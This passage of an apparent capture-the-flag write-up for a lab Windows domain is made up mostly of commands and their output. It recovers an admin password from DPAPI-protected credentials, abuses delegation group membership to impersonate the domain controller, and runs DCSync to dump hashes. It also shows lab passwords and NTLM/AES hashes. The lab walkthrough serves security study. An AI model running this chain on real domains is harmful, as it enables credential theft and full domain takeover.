unk: 0                                                                                                                                         
<SNIP>     blob: == DPAPI_BLOB ==                                                                                                                         
version: 1 
credential_guid: b'\xd0\x8c\x9d\xdf\x01\x15\xd1\x11\x8cz\x00\xc0O\xc2\x97\xeb' 
masterkey_version: 1 
masterkey_guid: 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b 
<SNIP>
```

We know is the 99 file. Let’s transfer and decode:

```bash
#on target
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$(pwd)\**99cf41a3-a552-4cf7-a8d7-aca2d6f7339b**"))

#on attack 
echo 'AgAAAAAAAAAAAAAAOQA5AGMAZgA0ADEAYQAzAC0AYQA1ADUAMgAtADQAYwBmADcALQBhADgAZAA3AC0AYQBjAGEAMgBkADYAZgA3ADMAMwA5AGIAAAAAAAAAAAAAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAA6o788ZIMNhaSpbkSX0mC01BGAAAJgAAAA2YAABAM9ZX6Z/40RYL/aC+dw/D5oa7WMYBN56zwgXYX4QrAIb4DtJoM27zWgMxygJ36SpSHHHQGJMgTs6nZN5U/1q7DBIpQlsWk15jpmUFS2czCScuP9C+dGdYT+p6AWb3L7PZUPqNDHqZRAgAAALFxHXdcOeYbfN6CsYeVaYZQRgAACYAAAANmAABiEtEJeAVpg4QA0lnUzAsf6koPtccl1os9yZrj1gTAc/oSmhBNPEE3/VVVPZw9g3NP26Wj3vO36IOmtsXWYABkukmijrSaAZUCAAAAAAEAAFgAAACn2p9w/uXURbRTVVUG8NTwr2BFf0a0DhdM8JymBww6mzQt8tVsTbDmCZ/uZu3bzOAOUXODaGaJOOKqRm2W8rHPOZ27YjtD1pd0MFJDocNJwdhN5pwTdz2v2JsrVVVE363zZjXHeXefhuL5AMwMQr6gpTsCGcxrd1ziTN9Q1lH9QtnYE7OZlbrZPhiWO2vvdX+UQcKlgpxcSGLaczL53/UJXrvt9hueRn+YXxnK+fiyZ0gmjMlP+yuxOiKSvHM/UT6NmuYewnApQrOBO3A5F1XKHguHKT+VS187uBu/TO1ZT4/CrsKws1aG7EkIXhRKzEgukAwn5nZlU6YaADdeQRDzCR1D0ycJKFyZd4QE1Nt6Kbgr+ukbiurwBJd/D1a3+WWCw+S2OJVHB9qqlcW11heJd+v9eGe1Wf6/PYCvyyWMsvusF8XUswgKQbkH821vscyNmJWDwMply/ZvellKuGQ1/s5gVqUkALQ=' | base64 -d > **99cf41a3-a552-4cf7-a8d7-aca2d6f7339b**
```

Now let’s use dpapi to generate a prekey, to decrypt the master key, to then decrypt the credentials. 

```bash
pypykatz dpapi prekey password 'S-1-5-21-4024337825-2033394866-2055507597-1115' 'Zer0the0ne' > prekey_file
```

Now let’s decrypt the master key:

```bash
pypykatz dpapi masterkey **99cf41a3-a552-4cf7-a8d7-aca2d6f7339b** prekey_file -o mkf
```

Now let’s decrypt the credential file:

```bash
pypykatz dpapi credential mkf C4BB96844A5C9DD45D5B6A9859252BA6

type : GENERIC (1)
last_written : 133622465035169458
target : LegacyGeneric:target=admin_acc
username : vintage\c.neri_adm
unknown4 : b'U\x00n\x00c\x00r\x004\x00c\x00k\x004\x00b\x00l\x003\x00P\x004\x00s\x00s\x00W\x000\x00r\x00d\x000\x003\x001\x002\x00'

```

Now convert it to little endian so we can read:

```bash
echo 'U\x00n\x00c\x00r\x004\x00c\x00k\x004\x00b\x00l\x003\x00P\x004\x00s\x00s\x00W\x000\x00r\x00d\x000\x003\x001\x002\x00' | iconv -t utf-16le

Uncr4ck4bl3P4ssW0rd0312
```

Let’s see if this password matches c.neri_ADM

```bash
kinit c.neri_adm

#verify
klist

Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: c.neri_adm@VINTAGE.HTB

Valid starting       Expires              Service principal
10/23/2025 06:25:18  10/23/2025 16:25:18  krbtgt/VINTAGE.HTB@VINTAGE.HTB
        renew until 10/24/2025 06:25:13
```

Let’s go on bloodhound and see what privileges this account has.

![image.png]({{ site.baseurl }}/assets/vintage/image%2011.png)

We are part of the delegated admin group. 

If we use the path finding option in bloodhound, we can plan out our path:

![image.png]({{ site.baseurl }}/assets/vintage/image%2012.png)

We can then get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. Impacket's [getST.py](http://getst.py/) example script can be used for that purpose. We can either create a SPN, or we can use existing ones. We go on bloodhound and search fs01 computer, this object has a SPN:

![image.png]({{ site.baseurl }}/assets/vintage/image%2013.png)

Attack outline:

1. Add to Group: We can add FS01$ to the group of DelegatedAdmins. This grants FS01$ the ability to impersonate users when authenticating to DC01$’s services (like CIFS). 
2. Impersonation: Using FS01$’s credentials and SPN, we request a Kerberos ticket (via [getST.py](http://getst.py/)) to impersonate DC01$ (the DC’s machine account) to a service on DC01$. This leverages RBCD’s S4U2Self/S4U2Proxy Kerberos extensions.
3. DCSync: The ticket lets us authenticate as DC01$ to perform DCSync (via [secretsdump.py](http://secretsdump.py/)), dumping all AD hashes because DC01$ has replication rights. As the DC's own account, it's inherently trusted for replication tasks like DCSync.

First, let’s add FS01$ to DelegatedAdmins Group:

```bash
bloodyAD -u 'c.neri_adm' -p 'Uncr4ck4bl3P4ssW0rd0312' -d vintage.htb --host dc01.vintage.htb -k add groupMember 'DelegatedAdmins' 'FS01$'

[+] FS01$ added to DelegatedAdmins
```

Now let’s impersonate the DC01$ account; this account is normally not marked sensitive by default; if it is, then this won’t work; The absence of a Sensitive: TRUE or CannotBeDelegated: TRUE field, combined with DC01$ being a computer account (not eligible for Protected Users), strongly suggests it is not protected against delegation. The "Account is sensitive and cannot be delegated" flag is likely not set.

```bash
impacket-getST -spn 'cifs/dc01.vintage.htb' -impersonate 'dc01$' 'vintage.htb/fs01$:fs01'

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating dc01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in dc01$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
```

Now export the ticket:

```bash
export KRB5CCNAME='dc01$@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache'
```

Now let’s dcsync and get the administrator password:

```bash
impacket-secretsdump -k dc01.vintage.htb -just-dc-user Administrator

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:468c7497513f8243b59980f2240a10de:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:5f22c4cf44bc5277d90b8e281b9ba3735636bd95a72f3870ae3de93513ce63c5
Administrator:aes128-cts-hmac-sha1-96:c119630313138df8cd2e98b5e2d018f7
Administrator:des-cbc-md5:c4d5072368c27fba
[*] Cleaning up...
```

We are now administrator. We can request a TGT ticket with getTGT:

```bash
impacket-getTGT 'vintage.htb/Administrator' -dc-ip 10.10.11.45 -hashes :468c7497513f8243b59980f2240a10de

[*] Saving ticket in Administrator.ccache

```

Export ticket and evil-winrm onto the machine:

```bash
export KRB5CCNAME=Administrator.ccache

evil-winrm -i dc01.vintage.htb -r vintage.htb
```

We are not part of the remote management group…

Let’s DCSync the whole device, we remember there is another user who is domain admin: `l.bianchi_adm`

```bash
impacket-secretsdump -k dc01.vintage.htb

<SNIP>
L.Bianchi_adm:1141:aad3b435b51404eeaad3b435b51404ee:6b751449807e0d73065b0423b64687f0:::

```

Now let’s request TGT ticket and logon:

```bash
impacket-getTGT 'vintage.htb/l.bianchi_adm' -dc-ip 10.10.11.45 -hashes :6b751449807e0d73065b0423b64687f0

[*] Saving ticket in l.bianchi_adm.ccache

#logon
KRB5CCNAME=l.bianchi_adm.ccache evil-winrm -i dc01.vintage.htb -r vintage.htb

```

We are domain admin:

![image.png]({{ site.baseurl }}/assets/vintage/image%2014.png)